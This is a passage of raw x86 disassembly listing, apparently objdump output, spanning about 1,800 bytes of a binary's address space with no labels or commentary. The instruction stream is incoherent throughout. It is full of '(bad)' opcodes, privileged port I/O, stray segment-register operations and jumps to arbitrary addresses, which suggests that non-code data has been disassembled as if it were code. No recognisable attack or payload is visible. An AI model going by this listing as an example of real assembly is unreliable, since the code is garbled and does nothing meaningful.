  41b98a:	stos   DWORD PTR es:[edi],eax
  41b98b:	sub    dh,BYTE PTR [eax*4-0x150918a5]
  41b992:	iret   
  41b993:	in     al,dx
  41b994:	ins    BYTE PTR es:[edi],dx
  41b995:	pop    eax
  41b996:	xchg   ebx,eax
  41b997:	imul   BYTE PTR [ebp+0x60ba0926]
  41b99d:	and    BYTE PTR [ebx+edx*2],ah
  41b9a0:	bound  edi,QWORD PTR [esi]
  41b9a2:	push   ds
  41b9a3:	ror    BYTE PTR [ecx],0x6a
  41b9a6:	lods   eax,DWORD PTR ds:[esi]
  41b9a7:	xchg   edx,eax
  41b9a8:	nop
  41b9a9:	nop
  41b9aa:	dec    ebx
  41b9ab:	push   DWORD PTR [ebp+0x6671dfe9]
  41b9b1:	sar    esi,cl
  41b9b3:	das    
  41b9b4:	aaa    
  41b9b5:	(bad)  
  41b9b6:	call   0x4c691932
  41b9bb:	sub    al,BYTE PTR [ebx-0x44]
  41b9be:	push   edi
  41b9bf:	inc    esp
  41b9c0:	inc    ebx
  41b9c1:	mov    ds:0x2e0a684,al
  41b9c6:	sub    eax,0x437fc9c
  41b9cb:	sbb    al,0x63
  41b9cd:	or     DWORD PTR [esi],0x30ea8a3b
  41b9d3:	push   ecx
  41b9d4:	ss jbe 0x41ba2d
  41b9d7:	or     eax,0x19a0499a
  41b9dc:	sub    edi,ebp
  41b9de:	loop   0x41b9e7
  41b9e0:	or     bl,al
  41b9e2:	cli    
  41b9e3:	(bad)  
  41b9e4:	sub    al,0x87
  41b9e6:	mov    WORD PTR [esi-0x2a29db58],ss
  41b9ec:	(bad)  
  41b9ed:	out    0x92,eax
  41b9ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9f0:	pop    edi
  41b9f1:	pop    edx
  41b9f2:	and    BYTE PTR [ebp-0x167fb69],al
  41b9f8:	dec    ecx
  41b9f9:	or     bh,BYTE PTR ds:0xb2d6cdce
  41b9ff:	mov    esp,0x2389e99f
  41ba04:	je     0x41b9f5
  41ba06:	test   al,0xa3
  41ba08:	inc    edx
  41ba09:	(bad)  
  41ba0a:	std    
  41ba0b:	or     eax,0x77add217
  41ba10:	loop   0x41ba66
  41ba12:	fisub  WORD PTR [eax]
  41ba14:	shr    BYTE PTR [edi+0x39],cl
  41ba17:	xchg   edi,eax
  41ba18:	pop    edi
  41ba19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba1a:	frstor [ebx]
  41ba1c:	aaa    
  41ba1d:	(bad)  
  41ba1e:	mov    esp,0x18a4bd2c
  41ba23:	and    bl,al
  41ba25:	and    eax,0x99b13471
  41ba2a:	pop    ss
  41ba2b:	pop    esp
  41ba2c:	sbb    esi,esi
  41ba2e:	test   eax,0x6f880cbf
  41ba33:	test   al,0x13
  41ba35:	shr    BYTE PTR [ebx+esi*4+0xf0a8d41],0x14
  41ba3d:	or     DWORD PTR [eax-0xa8a8c05],0x9c36a4b1
  41ba47:	ss int3 
  41ba49:	in     eax,0x51
  41ba4b:	mov    ebp,0xc1362e56
  41ba50:	and    al,0xd6
  41ba52:	and    WORD PTR [edx+0x17],ax
  41ba56:	or     al,0x22
  41ba58:	pop    ss
  41ba59:	cmc    
  41ba5a:	inc    ebx
  41ba5b:	or     al,0xa5
  41ba5d:	gs or  al,0x20
  41ba60:	add    al,0xf1
  41ba62:	xchg   edx,eax
  41ba63:	sub    DWORD PTR [esi-0x28aa31d3],esi
  41ba69:	jo     0x41baba
  41ba6b:	or     eax,0x5866ff5c
  41ba70:	fdiv   QWORD PTR [ebp-0x75]
  41ba73:	pop    ss
  41ba74:	mov    dl,0x95
  41ba76:	mov    dh,0x73
  41ba78:	sbb    al,0x65
  41ba7a:	sub    al,0x65
  41ba7c:	or     al,0x55
  41ba7e:	add    al,0x6a
  41ba80:	daa    
  41ba81:	mov    eax,gs:0x9e0182e
  41ba87:	repnz outs dx,DWORD PTR ds:[esi]
  41ba89:	dec    ebx
  41ba8a:	aas    
  41ba8b:	fmulp  st(2),st
  41ba8d:	lahf   
  41ba8e:	retf   0x9b6b
  41ba91:	or     cl,BYTE PTR [ecx-0x27aa907d]
  41ba97:	int    0x15
  41ba99:	pop    es
  41ba9a:	in     eax,0x5
  41ba9c:	xchg   ecx,eax
  41ba9d:	cmp    edx,DWORD PTR [ecx]
  41ba9f:	jnp    0x41baac
  41baa1:	mov    dh,0x3e
  41baa3:	or     dh,dl
  41baa5:	push   edi
  41baa6:	test   DWORD PTR ds:0xe89b4ccb,esi
  41baac:	mov    ch,0x49
  41baae:	xchg   ebx,eax
  41baaf:	dec    ebp
  41bab0:	loopne 0x41bb07
  41bab2:	loopne 0x41ba46
  41bab4:	std    
  41bab5:	cmp    BYTE PTR [ebp-0x210ff170],0xae
  41babc:	nop
  41babd:	push   ebp
  41babe:	or     al,BYTE PTR [eax+0x3a]
  41bac1:	adc    DWORD PTR [ebx-0x7ae50e80],edi
  41bac7:	xor    DWORD PTR [edi],ebx
  41bac9:	push   0xffffff98
  41bacb:	pop    eax
  41bacc:	pop    esi
  41bacd:	loopne 0x41ba8d
  41bacf:	call   0xee492c6e
  41bad4:	jno    0x41bb04
  41bad6:	or     eax,0x4b4ce499
  41badb:	loope  0x41bad8
  41badd:	mov    ds:0xd5b5508e,al
  41bae2:	movdqu xmm6,XMMWORD PTR [eax+0x74f55295]
  41baea:	repnz rol edi,cl
  41baed:	push   0x3ff9a23c
  41baf2:	mov    edi,0x391b9ef
  41baf7:	or     al,0xbf
  41baf9:	mov    al,ss:0x1f49839
  41baff:	pop    ecx
  41bb00:	push   es
  41bb01:	nop
  41bb02:	push   ss
  41bb03:	in     eax,dx
  41bb04:	mov    ah,BYTE PTR [edi-0x47d62025]
  41bb0a:	(bad)  
  41bb0b:	mov    ebx,0x4073db58
  41bb10:	sub    ebx,ebp
  41bb12:	js     0x41bb4d
  41bb14:	aaa    
  41bb15:	bound  esp,QWORD PTR [ecx-0x3646bea6]
  41bb1b:	dec    ebp
  41bb1c:	sub    edx,edi
  41bb1e:	inc    ebx
  41bb1f:	cld    
  41bb20:	or     ebx,DWORD PTR ds:0x23d12a79
  41bb26:	je     0x41bb7f
  41bb28:	push   cs
  41bb29:	sahf   
  41bb2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb2b:	shl    ch,cl
  41bb2d:	push   ebp
  41bb2e:	dec    esi
  41bb2f:	sub    BYTE PTR [ebx-0x674c23e5],0xeb
  41bb36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb37:	push   0xffffffd5
  41bb39:	test   eax,0x71f7acec
  41bb3e:	(bad)  
  41bb3f:	aad    0xb
  41bb41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb42:	mov    cl,BYTE PTR [eax+esi*8+0x2e]
  41bb46:	push   ds
  41bb47:	push   0x7d
  41bb49:	aam    0xe4
  41bb4b:	or     ecx,ecx
  41bb4d:	lods   eax,DWORD PTR ds:[esi]
  41bb4e:	sub    dh,cl
  41bb50:	test   DWORD PTR [ecx],edi
  41bb52:	test   BYTE PTR [ebp+0x1cd39954],bh
  41bb58:	xlat   BYTE PTR ds:[ebx]
  41bb59:	push   edi
  41bb5a:	xchg   ebp,eax
  41bb5b:	stos   BYTE PTR es:[edi],al
  41bb5c:	sbb    eax,DWORD PTR [eax-0x46ebcec6]
  41bb62:	mov    ds:0x9b7f5bba,al
  41bb67:	or     edx,DWORD PTR [ebx]
  41bb69:	mov    edi,0xa06bec3b
  41bb6e:	sti    
  41bb6f:	push   esp
  41bb70:	fistp  DWORD PTR [esi+0xda4195c]
  41bb76:	sbb    eax,0xd8b07aae
  41bb7b:	into   
  41bb7c:	les    ebx,FWORD PTR [esp+ebx*4-0x1a]
  41bb80:	scas   eax,DWORD PTR es:[edi]
  41bb81:	(bad)  
  41bb82:	adc    eax,0xa0dd2bf0
  41bb87:	pushf  
  41bb88:	(bad)  
  41bb89:	cld    
  41bb8a:	not    DWORD PTR [ebp+0x8]
  41bb8d:	addr16 ret 0xf7bf
  41bb91:	inc    esp
  41bb92:	sets   BYTE PTR [esi-0x75]
  41bb96:	xlat   BYTE PTR gs:[ebx]
  41bb98:	or     al,0xff
  41bb9a:	mov    dl,0xed
  41bb9c:	sub    edi,esi
  41bb9e:	pop    DWORD PTR [edi+eiz*4]
  41bba1:	(bad)  
  41bba2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bba3:	mov    al,0x84
  41bba5:	in     al,dx
  41bba6:	push   ss
  41bba7:	jno    0x41bba6
  41bba9:	dec    edi
  41bbaa:	pusha  
  41bbab:	add    cl,BYTE PTR [esi-0x5]
  41bbae:	in     al,0x51
  41bbb0:	xchg   edx,eax
  41bbb1:	jmp    0x19295479
  41bbb6:	push   edi
  41bbb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbb8:	iret   
  41bbb9:	xchg   ecx,eax
  41bbba:	scas   eax,DWORD PTR es:[edi]
  41bbbb:	jns    0x41bc3b
  41bbbd:	sbb    al,0x63
  41bbbf:	stc    
  41bbc0:	fcom   DWORD PTR ss:[ebp-0x2c]
  41bbc4:	shl    BYTE PTR [ebx+0x273d54ec],0x93
  41bbcb:	sahf   
  41bbcc:	enter  0xce67,0x85
  41bbd0:	pop    ebp
  41bbd1:	inc    edx
  41bbd2:	xchg   BYTE PTR [edx-0x59],ch
  41bbd5:	sahf   
  41bbd6:	add    esp,DWORD PTR [esi-0xa]
  41bbd9:	or     eax,0x7f54b68a
  41bbde:	scas   al,BYTE PTR es:[edi]
  41bbdf:	in     eax,0xea
  41bbe1:	call   0xa799:0xef8eb194
  41bbe8:	push   ebx
  41bbe9:	in     eax,0x32
  41bbeb:	in     eax,0x1c
  41bbed:	icebp  
  41bbee:	sbb    eax,0x1dcb16b8
  41bbf3:	xchg   al,bl
  41bbf5:	inc    eax
  41bbf6:	out    dx,eax
  41bbf7:	(bad)  
  41bbf8:	mov    dh,0xed
  41bbfa:	mov    edx,0x2a29d48f
  41bbff:	mov    edi,0x70bebc0a
  41bc04:	mov    ecx,0xdd71385a
  41bc09:	(bad)  
  41bc0a:	and    dh,BYTE PTR [ebx+0x7c89b8a9]
  41bc10:	add    eax,0x52f057dc
  41bc15:	(bad)  
  41bc16:	push   edi
  41bc17:	stos   BYTE PTR es:[edi],al
  41bc18:	std    
  41bc19:	mov    ah,0x45
  41bc1b:	sti    
  41bc1c:	stos   DWORD PTR es:[edi],eax
  41bc1d:	pop    ebx
  41bc1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc1f:	pop    ss
  41bc20:	lea    ebp,ds:0x94a83051
  41bc26:	or     BYTE PTR [esi+0x786adde],cl
  41bc2c:	mov    ?,WORD PTR [ecx]
  41bc2e:	into   
  41bc2f:	mov    esp,0xde12c5eb
  41bc34:	in     al,0x2d
  41bc36:	or     eax,0xc79b2b09
  41bc3b:	mov    ecx,0xc523e083
  41bc40:	(bad)  [esi-0x494d5778]
  41bc46:	hlt    
  41bc47:	jns    0x41bc62
  41bc49:	jns    0x41bc0d
  41bc4b:	out    0xf,eax
  41bc4d:	push   0xffffff85
  41bc4f:	aam    0xc8
  41bc51:	rol    edi,1
  41bc53:	jns    0x41bc9e
  41bc55:	mov    bh,0x48
  41bc57:	adc    bl,BYTE PTR [esi]
  41bc59:	js     0x41bbe3
  41bc5b:	jg     0x41bc29
  41bc5d:	inc    ecx
  41bc5e:	iret   
  41bc5f:	mov    cs,WORD PTR [eax]
  41bc61:	jmp    0x7cf23fdf
  41bc66:	and    eax,0xb97393c1
  41bc6b:	adc    al,0x28
  41bc6d:	ret    
  41bc6e:	add    eax,0x1bdb54ef
  41bc73:	pop    edi
  41bc74:	ret    
  41bc75:	dec    ebp
  41bc76:	data16 jg 0x41bce4
  41bc79:	jp     0x41bcd0
  41bc7b:	in     al,0x81
  41bc7d:	cli    
  41bc7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc7f:	jno    0x41bc70
  41bc81:	jle    0x41bccd
  41bc83:	mov    ebx,0x7ec675a0
  41bc88:	mov    bl,0xde
  41bc8a:	adc    ebx,DWORD PTR [edi+0x60]
  41bc8d:	ror    BYTE PTR [ecx-0x4a],1
  41bc90:	jb     0x41bcc6
  41bc92:	icebp  
  41bc93:	inc    ecx
  41bc94:	out    dx,eax
  41bc95:	out    dx,eax
  41bc96:	jnp    0x41bc98
  41bc98:	dec    esi
  41bc99:	push   0x86051d02
  41bc9e:	into   
  41bc9f:	(bad)  
  41bca0:	xlat   BYTE PTR ds:[ebx]
  41bca1:	popa   
  41bca2:	jne    0x41bd17
  41bca4:	cdq    
  41bca5:	inc    edi
  41bca6:	test   BYTE PTR [ecx],dl
  41bca8:	jle    0x41bc67
  41bcaa:	adc    ch,0x54
  41bcad:	xchg   ebx,eax
  41bcae:	inc    eax
  41bcaf:	aas    
  41bcb0:	(bad)  
  41bcb1:	repz fild QWORD PTR [esi]
  41bcb4:	pop    esp
  41bcb5:	sub    bl,BYTE PTR [edi+0x57]
  41bcb8:	push   cs
  41bcb9:	pop    esp
  41bcba:	popa   
  41bcbb:	inc    ebx
  41bcbc:	stos   BYTE PTR es:[edi],al
  41bcbd:	adc    al,0x25
  41bcbf:	push   ebp
  41bcc0:	and    eax,0xc4db9967
  41bcc5:	pop    ds
  41bcc6:	cmc    
  41bcc7:	repz push cx
  41bcca:	sub    eax,0x9755648a
  41bccf:	mov    eax,0x84db79ae
  41bcd4:	cdq    
  41bcd5:	mov    edi,0x6fd419fa
  41bcda:	(bad)  
  41bcdb:	cmp    ebx,eax
  41bcdd:	pop    esi
  41bcde:	bswap  edi
  41bce0:	or     al,0xf4
  41bce2:	push   ebp
  41bce3:	mov    cl,0x31
  41bce5:	add    eax,0xdf5f140f
  41bcea:	pop    edi
  41bceb:	outs   dx,DWORD PTR ds:[esi]
  41bcec:	das    
  41bced:	addr16 (bad) 
  41bcf0:	adc    dh,BYTE PTR [ebx+edi*4]
  41bcf3:	pop    es
  41bcf4:	jmp    0x41bc81
  41bcf6:	mov    ecx,0xb8b3e2a5
  41bcfb:	dec    esi
  41bcfc:	loope  0x41bcac
  41bcfe:	lods   al,BYTE PTR ds:[esi]
  41bcff:	push   esi
  41bd00:	jno    0x41bcad
  41bd02:	inc    ebx
  41bd03:	inc    edx
  41bd04:	and    BYTE PTR [esi],cl
  41bd06:	push   ebp
  41bd07:	lock fwait
  41bd09:	mov    ecx,0x12a0e619
  41bd0e:	je     0x41bd43
  41bd10:	sbb    eax,0x8f47c65b
  41bd15:	dec    esi
  41bd16:	call   0x7de8:0x43474161
  41bd1d:	dec    esp
  41bd1e:	jnp    0x41bcde
  41bd20:	adc    al,0xcd
  41bd22:	out    dx,eax
  41bd23:	jns    0x41bce0
  41bd25:	push   0xc5b984e0
  41bd2a:	dec    edi
  41bd2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd2c:	test   BYTE PTR [eax],0xed
  41bd2f:	xor    bh,bl
  41bd31:	mov    dh,0xed
  41bd33:	adc    al,0x13
  41bd35:	mov    ah,0xd8
  41bd37:	mov    al,0xa6
  41bd39:	mov    ds:0x8622ec2f,al
  41bd3e:	mov    cl,0x15
  41bd40:	xor    al,0xa
  41bd42:	cwde   
  41bd43:	popa   
  41bd44:	jge    0x41bd0b
  41bd46:	jmp    0x25c7840d
  41bd4b:	add    cl,BYTE PTR [eax-0x52ee13d1]
  41bd51:	fcmovu st,st(0)
  41bd53:	(bad)  [edi]
  41bd55:	sbb    BYTE PTR [ebx],0x51
  41bd58:	in     eax,0xfe
  41bd5a:	fld    DWORD PTR [ebx-0x57]
  41bd5d:	daa    
  41bd5e:	adc    eax,0x7d076045
  41bd63:	xor    ecx,DWORD PTR ss:[ebp+ebx*4-0x36]
  41bd68:	in     al,dx
  41bd69:	ret    
  41bd6a:	test   cl,ah
  41bd6c:	or     DWORD PTR [eax-0x1e],ecx
  41bd6f:	push   esi
  41bd70:	sbb    BYTE PTR [ecx-0x79],bl
  41bd73:	repnz sbb BYTE PTR es:[esi-0x757c1350],bh
  41bd7b:	rol    DWORD PTR [ecx+edx*4+0x315b2447],1
  41bd82:	push   edi
  41bd83:	mov    eax,ds:0x239fe545
  41bd88:	outs   dx,BYTE PTR es:[esi]
  41bd8a:	lods   al,BYTE PTR ds:[esi]
  41bd8b:	mov    ecx,edi
  41bd8d:	inc    esp
  41bd8e:	push   ebp
  41bd8f:	xchg   edi,eax
  41bd90:	int    0x3
  41bd92:	mov    esp,0xb348e2
  41bd97:	sub    esi,0x7945ad3c
  41bd9d:	fisttp QWORD PTR [edi]
  41bd9f:	push   ds
  41bda0:	or     edi,DWORD PTR [esp+ecx*1+0x577a5bee]
  41bda7:	pop    edx
  41bda8:	ficom  WORD PTR [edi-0x44]
  41bdab:	arpl   di,sp
  41bdad:	pop    ebx
  41bdae:	inc    edx
  41bdaf:	sbb    DWORD PTR [edi+0x5d8de533],edi
  41bdb5:	pop    ebx
  41bdb6:	data16 or al,0xd7
  41bdb9:	cwde   
  41bdba:	lods   al,BYTE PTR ds:[esi]
  41bdbb:	jne    0x41bd44
  41bdbd:	loopne 0x41bd9a
  41bdbf:	hlt    
  41bdc0:	cdq    
  41bdc1:	inc    edx
  41bdc2:	xchg   ebp,eax
  41bdc3:	jp     0x41bdfd
  41bdc5:	lahf   
  41bdc6:	in     al,0xe5
  41bdc8:	repz mov esi,0x6ec47d55
  41bdce:	arpl   WORD PTR [eax-0x3c12749b],bp
  41bdd4:	into   
  41bdd5:	dec    ebx
  41bdd6:	pop    es
  41bdd7:	inc    esi
  41bdd8:	pop    ss
  41bdd9:	test   BYTE PTR [edx+ebx*1+0xc],dh
  41bddd:	xchg   esp,eax
  41bdde:	jns    0x41bd7f
  41bde0:	jbe    0x41be26
  41bde2:	sub    BYTE PTR [ecx],ch
  41bde4:	mov    dl,0x6c
  41bde6:	iret   
  41bde7:	data16 jno 0x41bdfb
  41bdea:	fisttp WORD PTR [ebp-0x356fd1f3]
  41bdf0:	xchg   edi,eax
  41bdf1:	lods   al,BYTE PTR ds:[esi]
  41bdf2:	cs pusha 
  41bdf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdf5:	imul   edx,DWORD PTR [eax+0x37],0xffffff8e
  41bdf9:	dec    esi
  41bdfa:	mov    esi,0x1a60f99c
  41bdff:	cmp    ch,BYTE PTR [esi]
  41be01:	adc    eax,0x5c8fcd6b
  41be06:	xor    BYTE PTR [esi+0x2c791195],ch
  41be0c:	adc    eax,ecx
  41be0e:	mov    cl,0xe6
  41be10:	push   edx
  41be11:	repz out 0xe,eax
  41be14:	lods   al,BYTE PTR ds:[esi]
  41be15:	adc    BYTE PTR [esi+0x27],bh
  41be18:	xchg   esi,eax
  41be19:	mov    al,0xe
  41be1b:	(bad)  
  41be1c:	xchg   edi,eax
  41be1d:	dec    esp
  41be1e:	xchg   ecx,eax
  41be1f:	dec    eax
  41be20:	push   ebx
  41be21:	cmp    edi,DWORD PTR [ecx-0x7]
  41be24:	sub    al,cl
  41be26:	mov    edi,0xe31705cf
  41be2b:	jnp    0x41bdc0
  41be2d:	sbb    al,0x17
  41be2f:	or     BYTE PTR [ecx+0x17],al
  41be32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be33:	xchg   ecx,eax
  41be34:	fstp   TBYTE PTR cs:[edx-0x5c97d130]
  41be3b:	test   eax,0x4bedeffd
  41be40:	add    DWORD PTR [edx+0x38],ebx
  41be43:	sub    DWORD PTR [ebx+0x7a],ebp
  41be46:	iret   
  41be47:	cmp    bl,BYTE PTR [edx+0x65]
  41be4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be4b:	xor    BYTE PTR [ecx],ah
  41be4d:	cmp    al,0x36
  41be4f:	bound  ecx,QWORD PTR [esi]
  41be51:	es loopne 0x41be5c
  41be54:	rol    DWORD PTR gs:[edx-0x6a],cl
  41be58:	rcl    BYTE PTR [edi],1
  41be5a:	jle    0x41bdde
  41be5c:	mov    ecx,DWORD PTR [edi+0x284b114]
  41be62:	xchg   BYTE PTR [edx-0x5],ah
  41be65:	adc    al,0xb7
  41be67:	jnp    0x41be34
  41be69:	rol    DWORD PTR [ecx],0xa8
  41be6c:	or     DWORD PTR [esi-0x4a],esp
  41be6f:	mov    ch,0x86
  41be71:	xchg   ecx,eax
  41be72:	pop    ebp
  41be73:	xchg   ebx,eax
  41be74:	mov    ch,0xf9
  41be76:	adc    DWORD PTR [esp+edi*8+0x559ce447],edx
  41be7d:	mov    ch,0xee
  41be80:	popf   
  41be81:	or     eax,ebp
  41be83:	outs   dx,BYTE PTR ds:[esi]
  41be84:	popa   
  41be85:	into   
  41be86:	paddq  mm1,mm1
  41be89:	inc    esi
  41be8a:	inc    edi
  41be8b:	ss sbb al,0x62
  41be8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be90:	ss push ecx
  41be92:	xchg   edx,eax
  41be93:	or     bl,BYTE PTR [ebx+0x21209d32]
  41be99:	pop    edi
  41be9a:	dec    eax
  41be9b:	xchg   ebp,eax
  41be9c:	out    0x2b,eax
  41be9e:	or     eax,0xcc8f481d
  41bea3:	ss test bl,0x3a
  41bea7:	mov    ecx,0x45cc3769
  41beac:	shl    ebx,cl
  41beae:	xchg   ebx,eax
  41beaf:	mov    edx,0xc3781d16
  41beb4:	ret    
  41beb5:	stos   BYTE PTR es:[edi],al
  41beb6:	lods   al,BYTE PTR ds:[esi]
  41beb7:	iret   
  41beb8:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41beba:	inc    DWORD PTR ds:0x84e232ea
  41bec0:	dec    esp
  41bec1:	cld    
  41bec2:	mov    dl,0xe3
  41bec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bec5:	dec    ebx
  41bec6:	dec    edi
  41bec7:	loope  0x41bead
  41bec9:	sbb    eax,0x78442f85
  41bece:	sbb    esp,0xe520296d
  41bed4:	ja     0x41bf40
  41bed6:	inc    edi
  41bed7:	xor    eax,0x7733c9c4
  41bedc:	pop    edx
  41bedd:	jb     0x41bec1
  41bedf:	sbb    eax,0x3aa1d3cc
  41bee4:	add    eax,0x41d12b33
  41bee9:	clc    
  41beea:	push   ss
  41beeb:	cs call 0x68ec:0x16073927
  41bef3:	mov    ebp,gs
  41bef5:	mov    al,ds:0xec9e617
  41befa:	in     al,0xa7
  41befc:	sub    DWORD PTR [ecx+0x186b50dc],eax
  41bf02:	push   esp
  41bf03:	imul   ebp,esi,0x7244a530
  41bf09:	inc    edx
  41bf0a:	call   0x12a7d9d4
  41bf0f:	popa   
  41bf10:	cmp    al,0xfc
  41bf12:	add    eax,0x1b2879
  41bf17:	outs   dx,DWORD PTR ds:[esi]
  41bf18:	push   ss
  41bf19:	and    al,ah
  41bf1b:	and    esi,DWORD PTR [esi]
  41bf1d:	push   ebp
  41bf1e:	sbb    DWORD PTR [edx+eax*1-0x6d],ebx
  41bf22:	xacquire xchg DWORD PTR [ebx-0xf6fba72],edi
  41bf29:	ins    BYTE PTR es:[edi],dx
  41bf2a:	call   0x804fc8c4
  41bf2f:	test   eax,0xc29207f6
  41bf34:	add    al,0x51
  41bf36:	(bad)  
  41bf37:	enter  0x50f8,0x8a
  41bf3b:	pop    es
  41bf3c:	loopne 0x41bec8
  41bf3e:	cmp    DWORD PTR [ecx-0x39],eax
  41bf41:	dec    ecx
  41bf42:	popf   
  41bf43:	daa    
  41bf44:	push   ds
  41bf45:	mov    dl,BYTE PTR [ecx+0x74]
  41bf48:	mov    esp,0xf69e64aa
  41bf4d:	xchg   ebp,eax
  41bf4e:	mov    bl,0xf1
  41bf50:	xchg   edi,eax
  41bf51:	mov    db3,edi
  41bf54:	jae    0x41bf89
  41bf56:	in     al,0x89
  41bf58:	(bad)
  41bf5c:	adc    BYTE PTR [eax-0xe313b9],cl
  41bf62:	(bad)  
  41bf63:	stc    
  41bf64:	push   ebp
  41bf65:	aam    0xb9
  41bf67:	je     0x41bf84
  41bf69:	jmp    0x41bf60
  41bf6b:	imul   esp,DWORD PTR [edi],0x19
  41bf6e:	loopne 0x41bfab
  41bf70:	mov    bl,BYTE PTR [ecx+eax*4-0x28204263]
  41bf77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf78:	pop    ds
  41bf79:	in     al,0x5e
  41bf7b:	xlat   BYTE PTR ds:[ebx]
  41bf7c:	retf   
  41bf7d:	inc    ecx
  41bf7e:	sahf   
  41bf7f:	std    
  41bf80:	pushf  
  41bf81:	inc    esi
  41bf82:	retf   
  41bf83:	aaa    
  41bf84:	ins    BYTE PTR es:[edi],dx
  41bf85:	xor    al,0x95
  41bf87:	add    al,0xbe
  41bf89:	jae    0x41bffb
  41bf8b:	pop    ebp
  41bf8c:	lea    esi,[ecx+0x59957b48]
  41bf92:	mov    bl,0xa2
  41bf94:	cmp    bl,BYTE PTR [esi-0x1a]
  41bf97:	popf   
  41bf98:	and    eax,0x18d09e2e
  41bf9d:	sub    edi,esp
  41bf9f:	adc    bh,BYTE PTR [ebx+0x61]
  41bfa2:	fimul  WORD PTR [edi-0x246b5408]
  41bfa8:	xor    al,BYTE PTR [edx-0x7d2ba54a]
  41bfae:	mov    esi,fs
  41bfb0:	push   0x45
  41bfb2:	test   al,al
  41bfb4:	pop    ds
  41bfb5:	jg     0x41bf87
  41bfb7:	out    0xa9,al
  41bfb9:	(bad)  
  41bfba:	dec    ebx
  41bfbb:	jle    0x41bfeb
  41bfbd:	(bad)  
  41bfbe:	(bad)  
  41bfbf:	out    0xdf,eax
  41bfc1:	in     eax,dx
  41bfc2:	(bad)  
  41bfc3:	retf   
  41bfc4:	mov    cl,0xd5
  41bfc6:	icebp  
  41bfc7:	push   ebp
  41bfc8:	pop    ebx
  41bfc9:	dec    eax
  41bfca:	adc    dh,BYTE PTR ds:0x3975f2d2
  41bfd0:	mov    ds:0xedb75711,al
  41bfd5:	cmp    BYTE PTR [esi],bl
  41bfd7:	mov    edx,0xfee3cef2
  41bfdc:	or     bh,0xac
  41bfdf:	jo     0x41c006
  41bfe1:	jne    0x41bfaa
  41bfe3:	jp     0x41bf72
  41bfe5:	test   al,0xd0
  41bfe7:	xor    BYTE PTR [edx+0x24f4647b],al
  41bfed:	idiv   DWORD PTR [ecx+0x6f]
  41bff0:	out    dx,eax
  41bff1:	push   edx
  41bff2:	js     0x41c051
  41bff4:	nop
  41bff5:	ss enter 0xe8d9,0x51
  41bffa:	popa   
  41bffb:	inc    edx
  41bffc:	jmp    0x60d7:0xfacb334a
  41c003:	iret   
  41c004:	push   cs
  41c005:	mov    al,0xff
  41c007:	lods   eax,DWORD PTR ds:[esi]
  41c008:	mov    bl,0xe2
  41c00a:	jg     0x41c018
  41c00c:	add    DWORD PTR [ecx],ebx
  41c00e:	mov    ecx,0x8a6bdc5b
  41c013:	xor    ch,ah
  41c015:	cmp    eax,DWORD PTR [eax+0x4]
  41c018:	ret    
  41c019:	xchg   ebx,eax
  41c01a:	push   edi
  41c01b:	cdq    
  41c01c:	dec    edx
  41c01d:	and    bh,BYTE PTR [ebp-0x7]
  41c020:	in     eax,dx
  41c021:	xor    eax,0x98ec3406
  41c026:	icebp  
  41c027:	mov    dh,0xfc
  41c029:	sbb    DWORD PTR [edi-0x57],eax
  41c02c:	test   DWORD PTR [edx+0x53],ebp
  41c02f:	fwait
  41c030:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c031:	and    bh,BYTE PTR [ebx-0x73b10133]
  41c037:	ror    BYTE PTR [edx],0x18
  41c03a:	push   es
  41c03b:	inc    ebx
  41c03c:	sti    
  41c03d:	push   0x31
  41c03f:	in     al,dx
  41c040:	lods   al,BYTE PTR ds:[esi]
  41c041:	repnz push es
  41c043:	in     al,0xc8
  41c045:	popa   
  41c046:	cmp    BYTE PTR [ecx+0x19048ab7],dh
  41c04c:	imul   esp,eax,0xeaef5824
  41c052:	inc    esi
  41c053:	mov    ch,0x19
  41c055:	pop    ds
  41c056:	inc    ebp
  41c057:	and    eax,0xd32032ea
  41c05c:	rcr    DWORD PTR [ebx-0xbabcaeb],1
  41c062:	jg     0x41c002
  41c064:	cmp    al,0xb0
  41c066:	sbb    dh,cl
  41c068:	mov    cl,0xc
  41c06a:	xor    al,0x43
  41c06c:	fsubr  DWORD PTR [ebx]
  41c06e:	xchg   edi,eax
  41c06f:	push   edi
  41c070:	xchg   ch,al
  41c072:	nop
  41c073:	jle    0x41c012
  41c075:	add    ebp,DWORD PTR [edx-0xd88d2cb]
  41c07b:	inc    ebx
  41c07c:	cli    
  41c07d:	add    eax,0x3818729
  41c082:	cmp    BYTE PTR [esi-0x560f4130],0x52
  41c089:	ins    BYTE PTR es:[edi],dx
  41c08a:	fisubr WORD PTR [eax+0x78]
  41c08d:	jae    0x41c06f
  41c08f:	cmc    
  41c090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c091:	sti    
  41c092:	shl    BYTE PTR [edi+0x42],1
  41c095:	test   edi,esp
  41c097:	push   ecx
  41c098:	int3   
  41c099:	push   esi
  41c09a:	sub    ebx,ecx
  41c09c:	jo     0x41c103
  41c09e:	and    al,0x2
  41c0a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0a1:	jb     0x41c0ce
  41c0a3:	push   esp
  41c0a4:	dec    eax
  41c0a5:	in     eax,dx
  41c0a6:	dec    ebp
  41c0a7:	sar    al,1
  41c0a9:	adc    eax,DWORD PTR [edi-0x6ad89437]
  41c0af:	xchg   BYTE PTR [ebp-0x51a8fb12],al
